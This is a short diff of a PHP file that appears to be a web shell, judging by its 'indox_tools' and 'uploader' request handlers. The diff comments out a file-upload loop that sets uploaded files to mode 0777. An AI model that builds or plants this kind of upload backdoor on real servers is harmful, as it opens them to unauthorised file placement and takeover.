@@ -379,6 +379,7 @@ if(isset($_GET['indox_tools'])) {
 }
 
 //move file upload
+/*
 while(list($key,$value) = each($_FILES['file']['name']))
 {
     if(!empty($value)){ 
@@ -401,7 +402,7 @@ while(list($key,$value) = each($_FILES['file']['name']))
         chmod("$add",0777);
     }
 }
-
+*/
 // input upload handle
 if (isset($_GET['uploader'])) 
 {
